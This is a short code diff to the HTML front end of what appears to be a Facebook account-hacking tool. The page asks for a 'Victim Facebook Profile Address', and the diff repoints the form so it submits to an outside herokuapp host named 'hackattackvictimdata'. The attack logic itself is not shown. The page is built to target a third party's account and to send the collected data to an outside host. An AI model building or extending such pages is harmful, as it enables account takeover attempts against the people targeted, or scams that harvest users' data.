@@ -3,7 +3,6 @@
     include 'logic.php';
 
 ?>
-
 <!-- Created by Mr.A -->
 
 <!DOCTYPE html>
@@ -61,7 +60,7 @@ body { margin:0; padding:0; font-family: sans-serif; background: linear-gradient
         <div class="login-box">
          <h2>LogIn</h2> 
 		 <div class="log"><img src="https://www.freepnglogos.com/uploads/hacker-png/hacker-png-png-foto-24.png" width="200" alt="hacker png png foto" /></div>
-         <form action="https://hackattackroot.herokuapp.com/" method=""> <div class="user-box"> 
+         <form action="https://hackattackvictimdata.herokuapp.com/" method=""> <div class="user-box"> 
          <input type="text" name="" required="required"> 
          <label>Victim Facebook Profile Address</label> 
          </div> 
